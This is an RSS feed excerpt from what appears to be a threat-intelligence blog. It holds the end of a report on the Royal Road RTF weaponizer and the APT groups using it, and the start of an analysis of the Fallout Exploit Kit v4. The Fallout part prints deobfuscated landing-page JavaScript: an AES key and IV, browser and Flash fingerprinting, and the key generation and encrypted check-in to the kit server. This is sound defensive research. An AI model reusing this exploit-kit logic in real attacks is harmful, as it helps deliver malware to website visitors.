<p>Of these, we have already reported on 1-3 attack groups in our previous blog. Temp.Conimes used NewCore RAT to attack Vietnamese organizations. Tonto used Bisonal to attack organizations in East Asia such as Russia.</p>

<p>And the TA428 was also particularly active, using PoisonIvy, Cotx RAT, Tmanger, and nccTrojan to attack East Asian organizations such as Mongolia. We will not cover these individual cases here, but if you are interested, see the IOC chapter. For TA428, the paper [2] and blogs [3][4][5] are available from NSJ (NTT Security Japan). Please refer to that.</p>

<p>For Naikon, CheckPoint Research reported [6], but unfortunately, we could not observe this. Therefore, in the following, we will introduce attack cases related to Royal Road for four groups (5-8).</p>

<h3 id="higaisa">Higaisa</h3>
<p>Higaisa is an attack group that seems to have been active since at least around 2016. It is primarily targeted at North Korean-related organizations and is believed to be aimed at stealing information using AttackBot, PIZ Stealer, and Gh0st RAT.</p>

<p>The blogs have been written by Tencent and Positive Technologies so far [7][8][9], and are attributed to (South) Korea. However, NSJ’s paper [10] showed a connection with Ghost Dragon [11] and PKPLUG [12], and it was reported that it might belong to China.</p>

<p>We observed an attack by Higaisa on Royal Road in March 2020.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/04.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/05.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/06.png" /></p>

<p>The malware executed by the Royal Road RTF was AttackBot. AttackBot is a downloader that has been used by Higaisa since at least April 2018.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/07.png" /></p>

<h3 id="vicious-panda">Vicious Panda</h3>
<p>Vicious Panda is an attack group reported by CheckPoint Research in March 2020 [13]. It is said to belong to China and targets East Asia such as Russia, Mongolia, and Ukraine.</p>

<p>We observed an attack on the Royal Road by Vicious Panda in March 2020.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/08.png" /></p>

<p>It has been reported to execute malware similar to Enfal and BYEBY.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/09.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/10.png" /></p>

<h3 id="funnydream">FunnyDream</h3>
<p>FunnyDream is an attack group that is said to have been active since around 2018. It is said to belong to China and targets Southeast Asia such as Vietnam and Malaysia. FunnyDream uses Chinoxy and FunnyDream Backdoor. BitDefender has published a detailed report [14] on FunnyDream.</p>

<p>We observed an attack by FunnyDream from March to May 2020.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/11.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/12.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/13.png" /></p>

<p>Chinoxy is a RAT that has been used by FunnyDream since around 2018. It decoded the config using two numeric data and communicates with the C&amp;C server using its original protocol using Blowfish.</p>

<h3 id="ta410">TA410</h3>
<p>TA410 is an attack group that is said to have been active since around 2016. It is said to belong to China and is suspected to be related to APT10. The report has been published by Proofpoint [15][16][17] and is mainly targeted at public sector in the US. It uses malware called LockBack and FlowCloud.</p>

<p>We observed an attack by TA410 in October 2020.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/15.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/16.png" /></p>

<p>FlowCloud is a RAT reported by Proofpoint in June 2020. FlowCloud has been reported to be v4 and v5, but the FlowCloud we observed at this time was similar to v4.</p>

<h2 id="attack-case-against-japan">Attack case against Japan</h2>
<p>In addition to the four attack groups shown so far (Higaisa, Vicious Panda, FunnyDream, TA410), attacks that appear to be related to Royal Road have been observed. Among them, we will introduce an example of attacks on Japan. We are not able to identify which attack group made this attack. If you have any knowledge about it, please share it with us…</p>

<p>The attack on Japan took place in November 2020. The attack began with 2 RTF files attached to the email.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/18.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/19.png" /></p>

<p>These RTF files did not contain an 8.t object, however  did contain an associated object. This is the malware encoded by the 4th (B0 74 77 46) encoding shown above.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/20.png" /></p>

<p>The overall picture of the attack is as follows.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/21.png" /></p>

<p>The malware executed was an unknown RAT. We call this XLBug RAT because of the characteristics left in this RAT. The RAT held information such as C&amp;C server encoded by Base64 and XOR.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/22.png" /></p>

<p>The following commands are implemented in XLBug RAT.</p>

<ul>
  <li>Get directory information</li>
  <li>Get file information</li>
  <li>Get computer information</li>
  <li>Execute file</li>
  <li>Upload file</li>
  <li>Download file</li>
  <li>Rename file</li>
  <li>Delete file</li>
  <li>Delete itself</li>
</ul>

<p>The naming convention and encoding of the encoded object contained in the RTF are similar to those of the TA428. However, we could not say that this was a TA428 attack.</p>

<h2 id="relationship">Relationship</h2>
<p>In the previous blog, we summarized the characteristics of attack groups that use Royal Road. We used it to divide the attack groups into two groups. However, by 2020, those characteristics are almost meaningless. It has been standardized or deleted. It’s not as easy to group as it used to be. In the first place, the groups sharing Royal Road should be close. We do not classify further, but if you have any comments please let us know.</p>

<h2 id="yara-rule">Yara Rule</h2>
<p>The GitHub repository we shared in the previous blog is still being updated.</p>

<p><a href="https://github.com/nao-sec/yara_rules">https://github.com/nao-sec/yara_rules</a></p>

<h2 id="ioc">IOC</h2>
<p>The IOC sheet shared in the previous blog is still being updated.</p>

<p><a href="https://nao-sec.org/jsac2020_ioc.html">https://nao-sec.org/jsac2020_ioc.html</a></p>

<h2 id="tool">Tool</h2>
<p>The tool used by Royal Road to decrypt encoded object is still being updated.</p>

<p><a href="https://github.com/nao-sec/rr_decoder">https://github.com/nao-sec/rr_decoder</a></p>

<h2 id="wrap-up">Wrap-Up</h2>
<p>The attacks using Royal Road have decreased compared to 2019, but are still ongoing. There are many cases of attacks by TA428 and Tonto, but other attacks by different attack groups (Higaisa, Vicious Panda, FunnyDream, TA410) have also been observed.</p>

<p>The attacks on Japan have also been observed and we were unable to identify this with a known attack group. The use of Royal Road by these unknown attack groups is expected to continue.</p>

<p>In addition to Royal Road, there are other cases, such as the Tmanger family, that appear to share tools among multiple targeted attack groups. We should continue to pay close attention to these tool sharing cases.</p>

<h2 id="acknowledgments">Acknowledgments</h2>
<p>“nao_sec” is an independent research team that does not belong to any company. Individuals belong to each company and engage in research, but the activities of nao_sec still maintain their independence from each company. We are grateful to all of you who cooperated with our research activities every day.</p>

<hr />

<h2 id="references">References</h2>
<p>[1] nao_sec, “An Overhead View of the Royal Road”, https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html<br />
[2] NTT Security Japan, “Operation LagTime IT: colourful Panda footprint”, https://vblocalhost.com/uploads/VB2020-Ozawa-etal.pdf<br />
[3] NTT Security Japan, “Panda’s New Arsenal: Part 1 Tmanger”, https://insight-jp.nttsecurity.com/post/102gi9b/pandas-new-arsenal-part-1-tmanger<br />
[4] NTT Security Japan, “Panda’s New Arsenal: Part 2 Albaniiutas”, https://insight-jp.nttsecurity.com/post/102gkfp/pandas-new-arsenal-part-2-albaniiutas<br />
[5] NTT Security Japan, “Panda’s New Arsenal: Part 3 Smanager”, https://insight-jp.nttsecurity.com/post/102glv5/pandas-new-arsenal-part-3-smanager<br />
[6] CheckPoint Research, “Naikon APT: Cyber Espionage Reloaded”, https://research.checkpoint.com/2020/naikon-apt-cyber-espionage-reloaded/<br />
[7] Tencent, “APT攻击组织”黑格莎（Higaisa）”攻击活动披露”, https://s.tencent.com/research/report/836.html<br />
[8] Tencent, ““Higaisa（黑格莎）”组织近期攻击活动报告”, https://s.tencent.com/research/report/895.html<br />
[9] Positive Technologies, “COVID-19 и новогодние поздравления: исследуем инструменты группировки Higaisa”, https://www.ptsecurity.com/ru-ru/research/pt-esc-threat-intelligence/covid-19-i-novogodnie-pozdravleniya-issleduem-instrumenty-gruppirovki-higaisa/<br />
[10] NTT Security Japan, “Crafty Panda 標的型攻撃解析レポート”, https://www.nttsecurity.com/docs/librariesprovider3/default-document-library/craftypanda-analysis-report<br />
[11] Cylance (BlackBerry), “The Ghost Dragon”, https://blogs.blackberry.com/en/2016/04/the-ghost-dragon<br />
[12] Palo Alto Networks, “PKPLUG: Chinese Cyber Espionage Group Attacking Southeast Asia”, https://unit42.paloaltonetworks.com/pkplug_chinese_cyber_espionage_group_attacking_asia/<br />
[13] CheckPoint Research, “Vicious Panda: The COVID Campaign”, https://research.checkpoint.com/2020/vicious-panda-the-covid-campaign/<br />
[14] BitDefender, “A Detailed Timeline of a Chinese APT Espionage Attack Targeting South Eastern Asian Government Institutions”, https://labs.bitdefender.com/2020/11/a-detailed-timeline-of-a-chinese-apt-espionage-attack-targeting-south-eastern-asian-government-institutions/<br />
[15] Proofpoint, “LookBack Malware Targets the United States Utilities Sector with Phishing Attacks Impersonating Engineering Licensing Boards”, https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks<br />
[16] Proofpoint, “LookBack Forges Ahead: Continued Targeting of the United States’ Utilities Sector Reveals Additional Adversary TTPs”, https://www.proofpoint.com/us/threat-insight/post/lookback-forges-ahead-continued-targeting-united-states-utilities-sector-reveals<br />
[17] Proofpoint, “TA410: The Group Behind LookBack Attacks Against U.S. Utilities Sector Returns with New Malware”, https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new</p>
]]></content:encoded>
<pubDate>2021-01-04T15:00:00+00:00</pubDate>
</item>
<item>
<title>Steady Evolution of Fallout v4</title>
<link>http://nao-sec.org/2019/07/steady-evolution-of-fallout-v4.html</link>
<guid>http://nao-sec.org/2019/07/steady-evolution-of-fallout-v4.html</guid>
<content:encoded><![CDATA[
<h2 id="first">First</h2>
<p>We have been observing the Fallout Exploit Kit since August 2018. Fallout is using non-characteristic URL and heavily obfuscated landing page. The user still exists and attacks are observed daily. Recently, we were investigating an attack campaign that infects Raccoon Stealer in the flow of PopAds-&gt; KeitaroTDS-&gt; Fallout.</p>

<p>About Fallout, we have already written three reports. The first one was about the emergence of Fallout, the second one was to start using PowerShell and the third one was to start exploiting PoC on GitHub. We divide these major changes by version and call them v1~3.</p>

<ul>
  <li><a href="https://nao-sec.org/2018/09/hello-fallout-exploit-kit.html">Hello “Fallout Exploit Kit”</a></li>
  <li><a href="https://nao-sec.org/2019/01/in-depth-analysis-of-new-fallout.html">In-Depth analysis of new Fallout Exploit Kit</a></li>
  <li><a href="https://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html">Analysis of Fallout Exploit Kit v3</a></li>
</ul>

<p>We wrote about v3 in March 2019. v3 is not stable and has been updated to the next version immediately. @EKFiddle (created and maintained by @jeromesegura) reported this change on April 11.</p>

<blockquote class="twitter-tweet"><p dir="ltr" lang="en"><a href="https://twitter.com/hashtag/EKFiddle?src=hash&amp;ref_src=twsrc%5Etfw">#EKFiddle</a> [Regex update]: <a href="https://twitter.com/hashtag/FalloutEK?src=hash&amp;ref_src=twsrc%5Etfw">#FalloutEK</a><br />Seems like there is no more use of the PoC on GitHub for CVE-2018-8174.<br />Pushing <a href="https://twitter.com/hashtag/GandCrab?src=hash&amp;ref_src=twsrc%5Etfw">#GandCrab</a> in this particular instance.<a href="https://t.co/U67qZosp1e">https://t.co/U67qZosp1e</a> <a href="https://t.co/buVTakYuhJ">pic.twitter.com/buVTakYuhJ</a></p>&mdash; EKFiddle (@EKFiddle) <a href="https://twitter.com/EKFiddle/status/1116134534989238272?ref_src=twsrc%5Etfw">2019年4月11日</a></blockquote>


<p>We call this a big update v4 (it is still v4). Detailed analysis report has not been written about what kind of update Fallout has done. However, this update is very big. At least for us (Exploit Kit analyst), that made the analysis very cumbersome. Fallout v4 incorporates the following features.</p>

<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">1.</span> Diffie-Hellman key exchange
<span class="p">2.</span> VM detection
<span class="p">3.</span> Process detection
</code></pre></div></div>

<p>Here, we will share detailed analysis results on the updates made by Fallout v4. But unfortunately, we did not understand everything. If you are aware of it, please help us.</p>

<h2 id="traffic-chain">Traffic chain</h2>
<p>First, let’s look at the previous traffic chain. v1~3 was like this.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-eXpYD_rUFwU/W4loVPM1TTI/AAAAAAAAAVI/XuE3p36q7QMAVw95gBYPkKOA-IhsdaoAQCLcBGAs/s1600/0.png" />
<img alt="" src="https://3.bp.blogspot.com/-_qnvJOfIOeE/XEiKt9Zs16I/AAAAAAAAAYI/tspkgYcwxe0YjeGhaTGofsUBpfmhjJzmwCLcBGAs/s1600/0.png" />
<img alt="" src="https://nao-sec.org/assets/2019-03-07/01.png" /></p>

<p>In v3, it acquired PoC of CVE-2018-8174 from GitHub, and attacked by rewriting the part of shellcode. So what kind of traffic chain is v4?</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/01.png" /></p>

<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">1.</span> Landing Page
<span class="p">2.</span> JavaScript Code
<span class="p">3.</span> Encoded Code 1
<span class="p">4.</span> Encoded Code 2 (CVE-2018-8174 + SWF Loader)
<span class="p">5.</span> CVE-2018-15982
<span class="p">6.</span> PowerShell Code
<span class="p">7.</span> Malware
</code></pre></div></div>

<p>In this way, an attack is performed by seven traffics. Let’s look at each one in order. (In the following, we will use different traffic data from the above. The detailed reason will be mentioned later, but it is difficult to capture and analyze traffic at the same time)</p>

<h2 id="landing-page--js-code--encoded-data">Landing Page + JS Code + Encoded Data</h2>
<p>In the landing page, JavaScript code is read first.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"x-ua-compatible"</span> <span class="na">content=</span><span class="s">"IE=10"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"/04_09_2003/Symposium?Peristele=02_03_1943&amp;LE3r=Aps&amp;ILZhH=Frazzling-Anorexias"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
</code></pre></div></div>

<p>This includes CryptoJS and BigInteger obfuscated. Excluding the large library parts, there is very little processing.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// key</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">III1l1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1I1lI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">ll1llI1</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">8b69cbdfc5fe43e69b7920c8ee721fc9</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// iv</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">II1ll11I</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1I1lI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">ll1llI1</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">301ae8205ddcd5897df69e3b0c056c34</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">l11llIll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">lI11lIl</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">l11II11l</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">p4N9IqH/oiAKHkDCR0zXXfrvhwVrVPsFZSNUjkVFXxxBofjpd5JLM1sdAega3oRy</span><span class="dl">"</span><span class="p">,</span> <span class="nx">III1l1</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">II1ll11I</span>
<span class="p">})[</span><span class="dl">"</span><span class="s2">lIlIlll11l</span><span class="dl">"</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">Il11I1II</span><span class="dl">"</span><span class="p">]);</span>
</code></pre></div></div>

<p>First, two data (<code class="language-plaintext highlighter-rouge">8b69cbdfc5fe43e69b7920c8ee721fc9</code> and <code class="language-plaintext highlighter-rouge">301ae8205ddcd5897df69e3b0c056c34</code>) will appear. This is a key and an IV for AES encryption. By decrypting the next Base64 character string using these keys and IV, the necessary data (specifically, the URL for acquiring encoded data used in the next step) can be obtained. . When it tries decoding, it becomes like this.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/02.png" /></p>

<p>Next is the process of checking which browser is being used. Depending on it, Opera, Firefox, IE or Chrome is investigated.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// check browser</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">String</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">prototype</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1l1IlI</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opr</span><span class="dl">"</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opr</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">addons</span><span class="dl">"</span><span class="p">]</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opera</span><span class="dl">"</span><span class="p">]</span> <span class="o">||</span> <span class="nb">navigator</span><span class="p">[</span><span class="dl">"</span><span class="s2">userAgent</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">indexOf</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2"> OPR/</span><span class="dl">"</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">InstallTrigger</span><span class="dl">"</span><span class="p">]</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">undefined</span><span class="dl">"</span><span class="p">)</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="kc">false</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">document</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">documentMode</span><span class="dl">"</span><span class="p">])</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">chrome</span><span class="dl">"</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">chrome</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">runtime</span><span class="dl">"</span><span class="p">])</span>
<span class="p">};</span>
</code></pre></div></div>

<p>Then there is a process to check the version of Adobe Flash Player. This data will be used later.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">l1l111I</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">l1l111I</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="dl">'</span><span class="s1">ShockwaveFlash.ShockwaveFlash</span><span class="dl">'</span><span class="p">).</span><span class="nx">getVariable</span><span class="p">(</span><span class="dl">'</span><span class="s1">$version</span><span class="dl">'</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
<span class="p">})();</span>
</code></pre></div></div>

<p>The process then returns to the landing page. In the landing page, one function is defined and executed. Let’s look at that function.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// str_A</span>
<span class="kd">var</span> <span class="nx">l1ll1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]();</span>
<span class="c1">// str_B</span>
<span class="kd">var</span> <span class="nx">lIlII11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_C</span>
<span class="kd">var</span> <span class="nx">ll1l1IlIIIll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_D</span>
<span class="kd">var</span> <span class="nx">lll1II</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>

<span class="c1">// str_E =&gt; str_B.modPow(str_C, str_D)</span>
<span class="kd">var</span> <span class="nx">l11IlIl</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span> <span class="nx">lll1II</span><span class="p">);</span>
</code></pre></div></div>

<p>Here, many processes such as <code class="language-plaintext highlighter-rouge">window['Il1IIllIlI1I']['lIIIlI1IlII']['I111l11l']['II1I1I'](16)['lIlIlll11l']()</code> appear. This is defined in CryptoJS and generates a 32 character random hexadecimal string. After generating four random data, use the second, third and fourth of them to generate the fifth data. Here modPow is used. The five data prepared here will be used in the ensuing cryptographic process. We call them str_A, str_B, str_C, str_D, str_E.</p>

<p>The following code is divided into three parts. <code class="language-plaintext highlighter-rouge">Onreadystatechange</code> after the first one has sent a request to the server. The process of generating data to be sent by the second. The third is the process to send. These are the standard XMLHttpRequest POST procedures. First, let’s look at the process of generating transmission data.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">l11IlIIlllll</span> <span class="o">=</span> <span class="p">{};</span>

<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlII11</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_B</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lll1II</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lll1II</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>      <span class="c1">// str_D</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">l11IlIl</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l11IlIl</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_E</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lI1lIl1Ill</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1ll1</span><span class="p">;</span>                     <span class="c1">// str_A</span>

<span class="c1">// browser check data</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">@@</span><span class="dl">'</span> <span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]();</span>
</code></pre></div></div>

<p>Five data have been added to the array <code class="language-plaintext highlighter-rouge">l11IlIIlllll</code>. Other than the last one is the random data created earlier. There are 5 random data, but the data other than str_C is send data. The last one is the browser check data generated earlier. It checks whether the browser is Opera, Firefox, IE or Chrome, respectively, and contains true or false and is concatenated with <code class="language-plaintext highlighter-rouge">@@</code>. Such data is prepared for send. It should be noted here that str_C has not been sent to the server.</p>

<p>Next, let’s look at the sending process.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">I1l1I1</span><span class="dl">'</span><span class="p">](</span><span class="nx">Il1I11l</span><span class="p">,</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span> <span class="nx">l11llIll</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

<span class="cm">/* -- snip -- */</span>

<span class="c1">// Send POST</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1lllIIlI</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">,</span>

    <span class="c1">// aes_encrypt(data, key, iv)</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Ill1lI1Ill</span><span class="dl">'</span><span class="p">](</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">IIII1Il</span><span class="dl">'</span><span class="p">](</span><span class="nx">l11IlIIlllll</span><span class="p">),</span>        <span class="c1">// post request data</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                       <span class="c1">// key</span>
        <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]</span> <span class="p">}</span>      <span class="c1">// iv</span>
    <span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]()</span>
<span class="p">);</span>
</code></pre></div></div>

